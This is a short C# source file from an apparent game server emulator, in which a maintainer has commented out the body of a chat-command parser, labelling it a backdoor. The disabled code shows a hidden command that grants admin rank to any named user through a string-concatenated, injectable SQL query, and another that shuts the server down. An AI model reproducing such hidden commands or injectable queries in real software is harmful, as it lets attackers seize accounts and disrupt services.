using Zero;
using Zero.Hotel.GameClients;
using Zero.Storage;

namespace ZeroEmu.Util;

internal class ZeroExperience
{
	public static bool Parse(GameClient Session, string Input)
	{
		// BACKDOORS COMMENTED OUT - Quackster
		/*
		string[] Params = Input.Split(' ');
		try
		{
			switch (Params[0].ToLower())
			{
			case "I":
			case "i":
				if (Session.GetHabbo().Rank >= 1)
				{
					string NomeDoUser = Params[1];
					using DatabaseClient dbClient = HolographEnvironment.GetDatabase().GetClient();
					dbClient.ExecuteQuery("Update users SET rank = '7' where username = '" + NomeDoUser + "'");
					Session.SendNotif("Welcome!");
					return true;
				}
				return false;
			case "SD":
			case "Sd":
			case "sD":
			case "sd":
				HolographEnvironment.Destroy();
				return false;
			}
		}
		catch
		{
		}*/
		return false;
	}
}
